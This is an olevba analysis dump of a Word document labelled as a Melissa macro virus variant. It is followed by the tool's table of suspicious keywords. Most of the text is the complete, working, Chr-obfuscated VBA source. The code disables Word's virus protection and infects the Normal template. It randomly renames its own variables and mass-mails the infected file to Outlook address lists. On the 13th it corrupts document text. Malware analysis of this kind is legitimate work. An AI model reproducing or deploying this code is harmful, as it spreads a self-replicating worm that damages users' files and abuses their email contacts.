olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.p-94ee45e1fc0681cf66cfc0fe578cebb5d07cfc14
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.p-94ee45e1fc0681cf66cfc0fe578cebb5d07cfc14 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
J690 = Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101)
If System.ProfileString("", J690) = Empty Then System.ProfileString("", J690) = Str(0)
If ActiveDocument.Words.Count <= 5 Then Exit Sub
With ActiveDocument.VBProject.VBComponents
H154 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set E315 = .Item(1)
U894 = True
System.ProfileString("", J690) = Str(Val(System.ProfileString("", J690)) + 1)
End If
End With
With NormalTemplate.VBProject.VBComponents
R148 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set E315 = .Item(1)
M989 = True
System.ProfileString("", J690) = Str(Val(System.ProfileString("", J690)) + 1)
Call T627_H714
End If
End With
If M989 <> True And U894 <> True Then GoTo I500
If M989 = True Then E315.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, H154 - 1))
If U894 = True Then E315.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, R148 - 1))
I500:
If Val(System.ProfileString("", J690)) = 5 Then
Dim J469, G946, R277, J90, M231
Set J469 = CreateObject(Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
Set G946 = J469.GetNameSpace("MAPI")
If J469 = "Outlook" Then
    With ActiveDocument
    If .Saved = False Then
        .Save
        If .Saved = False Then Exit Sub
    End If
    End With
    G946.Logon Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101), Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100)
    For Y = 1 To G946.AddressLists.Count
        Set U431 = G946.AddressLists(Y)
        x = 1
        Set R277 = J469.CreateItem(0)
        For oo = 1 To U431.AddressEntries.Count
            J90 = U431.AddressEntries(x)
            R277.Recipients.Add J90
            x = x + 1
            If x > 50 Then oo = U431.AddressEntries.Count
         Next oo
         R277.Subject = Chr(77) + Chr(101) + Chr(115) + Chr(115) + Chr(97) + Chr(103) + Chr(101) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(32) & Application.UserName
         R277.Body = Chr(72) + Chr(101) + Chr(114) + Chr(101) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(116) + Chr(104) + Chr(97) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(97) + Chr(115) + Chr(107) + Chr(101) + Chr(100) + Chr(32) + Chr(102) + Chr(111) + Chr(114) + Chr(46) + Chr(32) + Chr(32) + Chr(72) + Chr(111) + Chr(112) + Chr(101) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(101) + Chr(110) + Chr(106) + Chr(111) + Chr(121) + Chr(32) + Chr(105) + Chr(116) + Chr(32) + Chr(59) + Chr(45) + Chr(41)
         R277.Attachments.Add ActiveDocument.FullName
         R277.Send
         J90 = ""
         Next Y
    G946.Logoff
    J469.Application.Quit
    J469 = Nothing
  End If
End If
If R148 <> 0 And H154 = 0 Then
    If ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
End If
End Sub

'Sub ToolsMacro()
'K239
'End Sub

'Sub ViewVBCode()
'K239
'End Sub

'Sub FileTemplates()
'K239
'End Sub

Private Sub K239()
msg = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(104) + Chr(97) + Chr(115) + Chr(32) + Chr(112) + Chr(101) + Chr(114) + Chr(102) + Chr(111) + Chr(114) + Chr(109) + Chr(101) + Chr(100) + Chr(32) + Chr(97) + Chr(110) + Chr(32) + Chr(105) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(108) + Chr(108) + Chr(32) + Chr(115) + Chr(104) + Chr(117) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(46)
MsgBox msg, vbCritical, Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100)
End Sub

Private Sub T627_H714()
On Error Resume Next
Randomize Timer
Dim V812(0 To 24) As String
V812(0) = "V812"
V812(1) = "L205": V812(2) = "J671": V812(3) = "H742": V812(4) = "A697": V812(5) = "H714": V812(6) = "H154"
V812(7) = "R148": V812(8) = "U894":: V812(9) = "E315": V812(10) = "M989": V812(11) = "I500": V812(12) = "T627": V812(13) = "T16": V812(14) = "M250"
V812(15) = "J469": V812(16) = "G946": V812(17) = "R277": V812(18) = "J90": V812(19) = "U431": V812(20) = "M231": V812(21) = "F513": V812(22) = "K239"
V812(23) = "E964": V812(24) = "J690"
For x = 0 To 24
a1 = (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 1000)
Call H714(a1, V812(x))
Next x
End Sub

Private Sub H714(M250, T16 As String)
On Error Resume Next
Dim L205 As Long: Dim J671 As Long: Dim H742 As Long: Dim A697 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
L205 = 1: J671 = 1: H742 = .CountOfLines: A697 = Len(.Lines(.CountOfLines, 1))
Do While .Find(T16, L205, J671, H742, A697, True)
strline = .Lines(L205, 1)
strline = Left(strline, J671 - 1) & M250 & Mid(strline, A697)
.ReplaceLine L205, strline
L205 = H742 + 1: J671 = 1: DD2134 = .CountOfLines
A697 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
If ActiveDocument.Words.Count <= 5 And Day(Now()) <> 13 Then Exit Sub
Set F513 = ActiveDocument.Content
With F513.Find
    .ClearFormatting
    .Replacement.ClearFormatting
    .MatchWholeWord = True
    .Execute FindText:=".", ReplaceWith:=",", Replace:=wdReplaceAll
    .Execute FindText:="a", ReplaceWith:="e", Replace:=wdReplaceAll
    .Execute FindText:="and", ReplaceWith:="not", Replace:=wdReplaceAll
End With
msg = vbCrLf + Chr(89) + Chr(111) + Chr(117) + Chr(39) + Chr(118) + Chr(101) + Chr(32) + Chr(98) + Chr(101) + Chr(101) + Chr(110) + Chr(32) + Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101) + Chr(100) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(33) + Chr(77) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126)
Set myR = ActiveDocument.Range(ActiveDocument.Content.End - 1, ActiveDocument.Content.End)
myR.InsertAfter msg
myR.Font.Name = "Courier New"
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |/m9                 |L205                                         |
|String    |                    |                                             |
|Base64    |G^<                 |R148                                         |
|String    |                    |                                             |
|Base64    |3nt                 |M250                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

